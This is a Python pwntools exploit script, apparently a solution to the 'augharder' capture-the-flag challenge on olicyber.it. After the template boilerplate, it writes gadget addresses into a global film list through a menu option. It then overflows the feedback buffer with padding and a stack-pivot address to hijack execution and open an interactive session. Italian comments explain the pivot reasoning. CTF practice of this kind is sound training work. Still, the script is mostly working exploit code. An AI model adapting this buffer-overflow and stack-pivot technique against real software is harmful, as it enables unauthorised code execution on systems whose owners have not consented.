#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ template template '--host=augharder.challs.olicyber.it' '--port=10607' augharder
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('augharder')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'augharder.challs.olicyber.it'
port = int(args.PORT or 10607)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
b *0x8048c3d
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

#

io = start()

sla = lambda a,b: io.sendlineafter(a,b)

# AAAA BBBB CCCC DDDD EEEE FFFF GGGG HHHH IIII JJJJ KKKK LLLL MMMM NNNN OOOO PPPP QQQQ RRRR SSSS TTTT UUUU VVVV WWWW XXXX YYYY ZZZZ
#                                      EC XX
#                                      ES PP

# esp1 = 0xff80222c


# esp = IIHH - 4 = IIHD (perche little end)
# eip diventa quello che contiene IIHD, quindi ci serve un leak dello stack


#payload = "".join(["".join([c for i in range(4)]) for c in string.ascii_uppercase]).encode()


# posso scrivere quello che voglio in listafilm attraverso opzione 2
# scrivo i gadget nei film
# ritorno a lista_film con opzione 5

#----------------------------------


sla(b'> ', b'2')

film_preferito = 0x804b060

sla(b':', str(0x08048717).encode())
sla(b':', str(film_preferito).encode())

for i in range(8):
    sla(b":", str(1000).encode())


lista_film_add = 0x0804b0a0

sla(b'> ', b'5')
payload = b'A'* 30 + p32(lista_film_add + 4) 
sla(b'feedback: ', payload)

io.interactive()

